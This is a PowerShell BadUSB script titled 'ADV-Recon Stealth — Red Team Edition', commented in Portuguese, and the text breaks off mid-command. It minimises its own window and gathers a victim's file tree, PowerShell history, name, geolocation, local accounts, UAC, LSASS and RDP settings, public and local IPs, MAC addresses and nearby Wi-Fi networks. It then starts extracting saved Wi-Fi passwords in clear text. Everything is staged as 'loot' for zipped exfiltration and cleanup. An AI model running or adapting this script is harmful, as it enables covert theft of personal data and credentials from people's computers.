<#
.SYNOPSIS
    ADV-Recon Stealth — Red Team Edition v2
    Recon rapido. Exfiltracao em 30s. Output: apenas OK ou NOK.
    Cleanup completo sempre.
    Corrigido: tree via cmd, browser data robusto com fallback.
#>

############################################################################################################################################################
# JANELA: minimizada
############################################################################################################################################################

$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int h, int s);'
Add-Type -Name W -Member $i -Namespace N
[N.W]::ShowWindow(([Diagnostics.Process]::GetCurrentProcess()|Get-Process).MainWindowHandle, 6)

############################################################################################################################################################
# LOG INTERNO (so escrito no Flipper se exfiltracao tiver sucesso)
############################################################################################################################################################

$Global:Log = @()
function L($m){$Global:Log+=("[{0:HH:mm:ss}] {1}" -f (Get-Date),$m)}

L 'ADV-Recon Stealth v2 iniciado'
L ('User: '+$env:USERNAME+' | PC: '+$env:COMPUTERNAME)

############################################################################################################################################################
# CONFIG
############################################################################################################################################################

$Timeout   = 30
$OutFolder = 'loot'
$Marker    = 'badusb'
$IgnoreIDs = @('C:','D:')
$IgnoreVOL = @('Google Drive','EVO')

$Fn  = $env:USERNAME+'-LOOT-'+(Get-Date -f 'yyyy-MM-dd_HH-mm')
$Zip = $Fn+'.zip'
$WD  = $env:TEMP+'\'+$Fn
$ZP  = $env:TEMP+'\'+$Zip

mkdir $WD -Force|Out-Null

############################################################################################################################################################
# RECON
############################################################################################################################################################

# --- ETAPA 1: Tree de diretorios (via cmd.exe — fiavel) ---
L 'ETAPA 1: Tree'
try{
    cmd /c "tree %USERPROFILE% /a /f" 2>$null | Out-File ($WD+'\tree.txt') -Encoding UTF8
    if((gi ($WD+'\tree.txt')).Length -lt 50){cmd /c "dir %USERPROFILE% /s /b" 2>$null | Out-File ($WD+'\tree.txt') -Encoding UTF8}
    L 'OK: Tree'
}catch{L 'FAIL: Tree'}

# --- ETAPA 2: Historico PowerShell ---
L 'ETAPA 2: PS History'
try{cp ($env:APPDATA+'\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt') ($WD+'\pshist.txt') -ea 0;L 'OK: PS History'}catch{L 'FAIL: PS History'}

# --- ETAPA 3: Dados do utilizador ---
L 'ETAPA 3: User data'
try{$fn=(Get-LocalUser $env:USERNAME).FullName}catch{$fn=$env:USERNAME}
try{$em=(Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName}catch{$em='N/D'}
try{
    Add-Type -AssemblyName System.Device
    $g=New-Object System.Device.Location.GeoCoordinateWatcher
    $g.Start()
    while($g.Status -ne 'Ready' -and $g.Permission -ne 'Denied'){Sleep -m 50}
    if($g.Permission -eq 'Denied'){$la='N/D';$lo='N/D';$gs='Denied'}
    else{$la=$g.Position.Location.Latitude;$lo=$g.Position.Location.Longitude;$gs='OK'}
    L 'OK: Geo'
}catch{$la='N/D';$lo='N/D';$gs='Err';L 'FAIL: Geo'}

# --- ETAPA 4: Utilizadores locais ---
L 'ETAPA 4: Local users'
try{$lu=Get-WmiObject Win32_UserAccount|ft Caption,Domain,Name,FullName,SID|Out-String;L 'OK: Users'}catch{$lu='Err';L 'FAIL: Users'}

# --- ETAPA 5: UAC / LSASS / RDP ---
L 'ETAPA 5: UAC/LSASS/RDP'
try{
    $c=(gp 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System').ConsentPromptBehaviorAdmin
    $p=(gp 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System').PromptOnSecureDesktop
    if($c -eq 0 -and $p -eq 0){$ua='Never'}
    elseif($c -eq 5 -and $p -eq 0){$ua='Notify(no dim)'}
    elseif($c -eq 5 -and $p -eq 1){$ua='Notify(default)'}
    elseif($c -eq 2 -and $p -eq 1){$ua='Always'}
    else{$ua='Unknown'}
}catch{$ua='Err'}
try{$ls=Get-Process lsass -ea Stop;if($ls.ProtectedProcess){$lst='PPL'}else{$lst='No PPL'}}catch{$lst='N/F'}
try{if((gp 'hklm:\System\CurrentControlSet\Control\Terminal Server').fDenyTSConnections -eq 0){$rd='On'}else{$rd='Off'}}catch{$rd='Err'}
L 'OK: UAC/LSASS/RDP'

# --- ETAPA 6: Rede ---
L 'ETAPA 6: Network'
try{$pu=(iwr ipinfo.io/ip -UseBasicParsing -TimeoutSec 3).Content.Trim()}catch{$pu='Err'}
try{$lip=Get-NetIPAddress -IfAlias '*Ethernet*','*Wi-Fi*' -AddrFam IPv4 -ea 0|Select IfAlias,IPAddress,PrefixOrigin|Out-String}catch{$lip='Err'}
try{$mc=Get-NetAdapter -Name '*Ethernet*','*Wi-Fi*' -ea 0|Select Name,MacAddress,Status|Out-String}catch{$mc='Err'}
L 'OK: Network'

# --- ETAPA 7: WiFi ---
L 'ETAPA 7: WiFi'
try{$nw=(netsh wlan show networks mode=Bssid 2>$null|?{$_-like'SSID*'-or$_-like'*Auth*'-or$_-like'*Enc*'}).trim();if(!$nw){$nw='None'}}catch{$nw='Err'}
try{
    $wp=(netsh wlan show profiles 2>$null)|sls ':(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$_}|%{(netsh wlan show profile name="$n" key=clear 2>$null